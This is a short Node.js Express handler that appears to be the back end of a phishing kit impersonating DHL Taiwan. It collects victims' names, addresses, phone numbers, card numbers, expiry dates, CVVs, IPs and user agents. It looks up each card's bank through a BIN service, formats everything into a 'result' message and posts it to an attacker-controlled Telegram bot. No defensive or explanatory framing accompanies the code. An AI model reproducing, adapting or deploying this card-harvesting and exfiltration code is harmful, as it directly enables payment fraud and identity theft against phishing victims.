const axios = require("axios");

const sendTwRes = async (req, res) => {
    let {
        fullname,
        address,
        city,
        pcode,
        telephone,
        ccnum,
        ccexp,
        cvv,
        bin,
        ip,
        userAgent,
        telegramId,
    } = req.body;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, "");
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }

    const response = await axios.get(`https://lookup.binlist.net/${bin}`);
    let bankName;

    if (response.data.bank) {
        bankName = response.data.bank.name;
    }

    binList = `${bin} | ${pcode} | ${bankName}`;
    var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nAddress: ${address}\nCity: ${city}\nZIP: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
    await axios
        .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
                chat_id: telegramId,
                text: `DHL Taiwan:\n${originalText}`,
                parse_mode: "Markdown",
            }
        )
        .catch((e) => {
            console.log(e);
        });

    res.sendStatus(200);
};

module.exports = {
    sendTwRes,
};
